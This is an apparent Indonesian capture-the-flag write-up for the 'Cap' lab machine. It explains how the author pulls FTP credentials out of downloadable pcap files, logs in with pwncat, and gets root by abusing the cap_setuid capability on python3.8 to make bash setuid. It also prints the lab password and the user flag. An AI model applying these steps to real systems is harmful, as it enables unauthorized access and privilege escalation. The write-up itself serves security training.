# Cap

Pada path /data/1 terdapat file pcap yang dapat di download. Ketika dibuka ternyata itu merupakan file pcap hasil enumerasi dengan gobuster kita. cek di /data/0 terdapat file pcap lain. dan setelah dilihat didalamnya terdapat user yang login ke vsFTPd dengan cred `nathan:Buck3tH4TF0RM3!`

```log
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

Langsung saya connect dengan pwncat `pwncat nathan@10.10.10.245` dan berhasil mendapatkan shell untuk usernya. dari sini kita sudah mendapatkan flag user : 17e89e517ef51d3eb4dbb0423073e8a7

lanjut dengan linpeas ternyata terdapat yang aneh pada file python cap_setuid.

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Dari sini kita coba menjalankan python dan dengan root priviledge kita rubah /bin/bash menjadi setuid. Dari situ kita kembali ke shell biasa dan menjalankan command `/bin/bash -p` untuk mendapatkan priviledge escalation dan mendapatkan flag root